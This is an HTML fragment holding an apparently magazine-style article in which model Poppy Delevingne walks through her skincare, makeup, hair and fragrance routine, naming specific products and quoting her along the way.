            <h1>Beauty Secrets</h1>

            <img src="imaage.jpg" alt="Nature">

            <p class="main__p">Poppy Delevingne is pulling back the curtains on her beauty routine—and sparing no detail on how she maintains her natural glow. “How long have you got?” jokes the British actress and model as she whips out her Medical Beauty Research Enzyme Cleansing Booster, pours the powder into her palms, and uses water to mix it into a fluffy foam. “I had really bad skin when I hit 30 and it basically saved my life,” she explains of the German brand’s professional-grade cleanser. “Now my face has gone really pink, which means it’s time to take it off,” she laughs. “I look like a tomato!” After spreading on Dr. Barbara Sturm’s Face Mask, paying special attention to her T-zone, she removes it and tones with Mario Badescu’s Rose and Witch Hazel Toner. “I’ve always been a real beauty junkie,” she explains while layering on SkinCeuticals’s C E Ferulic serum. “I learned a lot of beauty stuff from my grandmother when I was growing up,” says Delevingne. “She always had dressing tables filled with lotions and potions.” For her next moisture-boosting layer, she cracks open one of her “secret weapon” Hyaluronic Ampoules, which she likes to keep in the fridge or take with her on the go. “I always carry these on the airplane with me—[they’re the best] to keep in your handbag,” she explains. Onto makeup, she mixes a few drops of Heliocare 360° Sunscreen into her foundation, then brightens up her undereyes with Bobbi Brown’s Retouching Face Pencil. After pausing to touch up her lived-in, buttery blonde waves with a blast of Batiste Dry Shampoo on the roots and running nourishing keratin oil through the ends, she dips her makeup brush into her Charlotte Tilbury Filmstar Bronze & Glow Contour Duo. “I’m one of these girls that loves to be more bronzed than rosy cheeked, if you know what I mean,” she poses. Putting the final touches on her look, she layers her lashes with a few coats of mascara and swipes on Nars Lipstick in peachy pink nude Raw Seduction. “I actually feel like as I get older, I wear less [makeup]. I just become more cozy and less worried about how I look.” A spritz or two of Jo Malone London’s Jasmine Sambac & Marigold later—“I like to spray it and do a little wiggle,” she laughs—her routine is complete. “I feel like the Brits are quite laid back when it comes to beauty,” she says. “We’re more interested in when we can get to the pub. We’re all about pints, less about mascara.”</p>
